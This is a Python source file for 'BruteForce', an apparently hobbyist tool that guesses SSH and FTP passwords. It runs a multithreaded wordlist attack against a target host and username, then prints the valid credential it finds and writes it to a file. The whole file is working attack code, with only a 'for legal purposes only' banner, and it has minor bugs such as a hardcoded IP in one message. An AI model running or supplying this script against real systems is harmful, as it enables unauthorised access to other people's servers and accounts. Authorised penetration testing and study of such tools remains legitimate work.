# SSH & FTP Brute Force Tool. ⭐
# Description: SSH & FTP brute-forcing tool written in python
# -*- coding: UTF-8 -*-
# ToolName   : BruteForce
# Author     : HackExitx0x
# Version    : 1.0
# Copyright  : HackExitx0x (2023)
# Github     : https://github.com/hackone103/BruteForce/

# Contact    : 
# Description: BruteForce is a ssh & ftp Password BruteForce  tool in python
# 1st Commit : 25-08-2023
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : HackExitx0x, Docxinfo.com
# Env        : #!/usr/bin/env python

# import Python Modules.
import ftplib, threading, queue, sys, socket, time
import argparse
import datetime
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception, SSHException


# Python Code Running Staring Time Count*
start_time = time.time()

# Socket Chacking Host and port active and open ports
def is_port_open(hostname, port):
    # Try not error
    try:
        # Create a Socket Conncetions
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set a timeout for the connection attempt
        sock.settimeout(1)  
        # Try to conncet
        sock.connect((hostname, port))
        # Close the socket
        sock.close()
        # Return True
        return True
    # Error
    except (socket.timeout, ConnectionRefusedError):
        # Return false
        return False
 
# Get The Current Date and Time
current_datetime = datetime.datetime.now()
# Format the date and time as a string
formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
# Print the formatted date and time


# Define ANSI escape codes for colors
# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
RESET = "\033[0m"

# Regular Snippets
samp = "√"
ask1  =     f"{green}[{white}*{green}] {yellow}{RESET}"
ask  =     f"{green}[{white}?{green}] {yellow}{RESET}"
success = f"{yellow}[{white}√{yellow}] {green}{RESET}"
error  =    f"{blue}[{white}!{blue}] {red}{RESET}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}{RESET}"
info2  =   f"{green}[{white}•{green}] {purple}{RESET}"

# self file name
files = sys.argv[0]


# 1. User Inputes arguments
argparse = argparse.ArgumentParser(description="show this help message and exit", usage=f"python3 {files} -i [IP] -p [Port] -u [USERNAME] -w [WORDLIST FILE] -t [THREAD] -T [TIMEOUT] -o [OPTIONS] -oN [OUTPUT]")
argparse._optionals.title ="Basic Help Menu" 
argparse.add_argument('-i', '--ip', action="store", dest='hostname',  help='Target IP Address', required=True)
argparse.add_argument('-p', '--port', action="store" , default=22, type=int, dest='port', help='Target Port Number (Default 22)')
argparse.add_argument('-u', '--username', action="store", dest='username', help='SSH & FTP User name (Default root)', required=True)
argparse.add_argument('-w', '--worlist', action="store", default="wordlist/ssh20Password.txt", dest='wordlist', help='Wordlist File Path')
argparse.add_argument('-o', '--option', action="store", dest='options', type=str, help='Enter Options for SSH & FTP (Default ssh)', required=True)
argparse.add_argument('-v', '--verbose', action="store_true", help='Enable verbose mode')
argparse.add_argument('-t', '--threads', action="store", type=int, default=9,dest='threads', help='No of threads (Default 9 Exaption ssh maxumum 9 thrades and increas outpu error)')
argparse.add_argument('-T', '--timeout', action="store", default=5 , type=int, dest='timeout', help='Request timeout (Default 5)')
argparse.add_argument('-oN', '--output', action="store" , dest='output', help='Output file name')

# 2. Inputs Arguments
InputArguments = argparse.parse_args()

# 3. Input Arguments Variables
hostname = InputArguments.hostname
port = InputArguments.port
username = InputArguments.username
options = InputArguments.options
wordlist = InputArguments.wordlist
verbose  = InputArguments.verbose
threads  = InputArguments.threads
output = InputArguments.output
timeout = InputArguments.timeout

# Nofifications
BannerFist ="BruteForce v1.0 (c)2023 by van HackExitx0x - for legal purposes only"
BannerSecund ="BruteForce {} (https://github.com/hackone103/BruteForce/) {} starting at {} {} {}\n".format(green,RESET,green,formatted_datetime,RESET)

# Banner Print
print(BannerFist)
print(BannerSecund)

# Check Input Users Host an Port open and Close Status
BannerTherd = ask1 +"Checking Host and port status...."
print(BannerTherd)
time.sleep(2)
if is_port_open(hostname, port):
    OpenPortBanner = ask1+" Active Host : "+bblue+str(hostname)+RESET+" Port is Open : "+bblue+str(port)+RESET
    # Banner Open Port
    print(OpenPortBanner)
else:
    print(f"{error}Port {red}{hostname}{RESET} is closed on {red}{port}{RESET}")
    print(f"{error}{purple}Exiting....{RESET}")
    print(f"{error}{purple}Goodbye....{RESET}")
    
    exit()

Timeaa = time.sleep(0.1)

# 5. Show Input Agumenst User

print(f"\n{success} Hostname  : {bpurple}{hostname}{RESET}")
time.sleep(0.1)
print(f"{success} Port      : {bpurple}{port}{RESET}")
time.sleep(0.1)
print(f"{success} Options   : {bpurple}{options}{RESET}")
time.sleep(0.1)
print(f"{success} username  : {bpurple}{username}{RESET}")
time.sleep(0.1)
print(f"{success} Wordlist  : {bpurple}{wordlist}{RESET}")
time.sleep(0.1)
print(f"{success} Verbose   : {bpurple}{verbose}{RESET}")
time.sleep(0.1)
print(f"{success} Thrads    : {bpurple}{threads}{RESET}")
time.sleep(0.1)
print(f"{success} Timeout   : {bpurple}{timeout}{RESET}")
time.sleep(0.1)
print(f"{success} Verbose   : {bpurple}{verbose}{RESET}")
time.sleep(0.1)
print(f"{success} Output    : {bpurple}{output}{RESET}\n")
time.sleep(0.1)


# Notifications
StaringBrute = ask1 +" Starting Brute Force.....\n"
print(StaringBrute)
#  Variables
guessed = False
correct_password = ''
ThreAds = []


# SSH Functions 
def SSH_FunctinsBruteForce(hostname, username):
    global guessed, correct_password
    sshclient = SSHClient()
    sshclient.set_missing_host_key_policy(AutoAddPolicy())

    while not guessed and not q.empty():
        password = q.get()
        # Verbose
        if verbose == True:
           # Verbose
           ssh_verbose = "{} [SSH] Hostname : [{}] : login : {}[{}]{} Password : {}[{}]".format(error, hostname,bgreen, username, RESET,red,password)
           print(ssh_verbose)
          
        try:
            sshclient.connect(hostname=hostname, username=username, password=password, timeout=5)
            # print(f"{success} {green}[{port}] [ssh] {green} Hostname : [{hostname}]  {byellow} Username : {bgreen}{username}{byellow} Password : {bgreen}{password}{RESET}")
            guessed = True
            correct_password = password
        except socket.timeout:
            print("[+] host is unreachable. Exiting..")
            exit()
        except AuthenticationException:
            #print("[+] Authentication problem..")
            pass
        except SSHException:
            print("[+] Quota exceeded. Exiting..")
            time.sleep(0.1)
            #return ssh_guesser(hostname, username)
        time.sleep(0.1)
        sshclient.close()
        q.task_done()

# Ftp Functions

def FTP_FunctionsBruteForce(hostname, username):
    global guessed, correct_password
    ftpclient = ftplib.FTP()

    while not guessed and not q.empty():
        password = q.get()
        # Verbose
        if verbose == True:
           # Verbose
           ftp_verbose = "{} [FTP] Hostname : [{}] : login : {}[{}]{} Password : {}[{}]".format(error, hostname,bgreen, username, RESET,red,password)
           print(ftp_verbose)
        try:
            ftpclient.connect(hostname, 21, timeout=3)
            ftpclient.login(username,password)
            #print(f"{success} {green}[{port}] [FTP] {green} Hostname : [{hostname}] {byellow} Username : {bgreen}{username}{byellow} Password : {bgreen}{password}{RESET}")
            guessed = True
            correct_password = password
        except Exception as e:
            pass
        time.sleep(0.1)
        ftpclient.close()
        q.task_done()

# Cintainer Password 
q = queue.Queue()



# Options And Conditions

if options == 'ssh':

    with open(wordlist,'r') as file:
        for password in file.read().splitlines():
            q.put(password)

    for i in range(threads):
        t = threading.Thread(target=SSH_FunctinsBruteForce, args=(hostname,username), daemon=True)
        t.start()
        ThreAds.append(t)


if options == 'ftp':

    with open(wordlist, 'r') as file:
        for password in file.read().splitlines():
            q.put(password)

    for i in range(threads):
        t = threading.Thread(target=FTP_FunctionsBruteForce, args=(hostname, username), daemon=True)
        t.start()
        ThreAds.append(t)

# HJoin

for t in ThreAds:
    t.join()

# q.join()
# Tiem Cunter End


while True:
    if guessed == True:
       SucessSMS = "{}{} Target Sucessfully Completed, 1 Valid Password Found".format(info,bblue)
       print("\n")
       # Get The Current Date and Time
       Gcurrent_datetime = datetime.datetime.now()
       # Format the date and time as a string
       fformatted_datetime = Gcurrent_datetime.strftime("%Y-%m-%d %H:%M:%S")
      # Print the formatted date and ti
       sms1 = '{} {}[INFO]{} {}Testing if password authentication is supported by {}{}://{}@{}:{}'.format(info2, bblue,RESET,white,cyan,options,username,hostname,port)
       sms2 = '{} {}[INFO]{} {}Successful, password authentication is supported by {}{}://192.168.9.128:22'.format(info2, bblue,RESET,white,cyan,options,hostname,port)
   

       #code = "{} [DATA]  Attacking ssh://{}:{}/".format(success, hostname, port)
       Outputs = "{} [DATA] Attacking {}ssh://{}:{}/".format(info,yellow,hostname, port)
       UserData =  "{} {}[{}] {}[{}]{} Hostname : {}{}{}  login : {}{}{}  Password : {}{}{}".format(ask1,green,options.upper(),bblue,port,RESET,bgreen,hostname,RESET,bgreen,username,RESET,bgreen,correct_password,RESET)
       # {green}[{port}] [FTP] {green} Hostname : [{hostname}] {byellow} Username : {bgreen}{username}{byellow} Password : {bgreen}{password}{RESET}")

       
       BannerSecundd ="{} BruteForce {} (https://github.com/hackone103/BruteForce/) {} Time Count at {} {} {}".format(ask1,green,RESET,green,fformatted_datetime,RESET)


       Outs = "{} Exiting....".format(ask1,RESET)
       Outs2 = "{} Good By Opps".format(ask1,RESET)
       
       print(SucessSMS+"\n")
       print(sms1)
       print(sms2+"\n")
       print(Outputs)
       print(UserData)

       print(BannerSecundd)
       print(Outs+"\n\n")
       print(Outs2+"\n\n")
       #print(Outs2)
       

       
       if (output):
         with open(output,'w') as file:
             file.write(BannerFist+"\n")
             file.write(BannerSecund+"\n")
             file.write(BannerTherd+"\n")
             file.write(OpenPortBanner+"\n")
             file.write(StaringBrute+"\n")
             file.write(SucessSMS+"\n")
             file.write(Outputs+"\n")
             file.write(UserData+"\n")
             file.write(BannerSecundd+"\n")
             file.write(Outs+"\n")
             #file.write(Outs2+"\n")

       exit()
    elif guessed == False and q.empty():
       print(f"\n{error} Cannot find valid password")
       print(f"{error} Password could not be found, Change wordlist file, try again...")
       print(f"{purple}[+]  Exiting....{RESET}")
       print(f"{bpurple}[+]  Goodbye....{RESET}")
       break


        



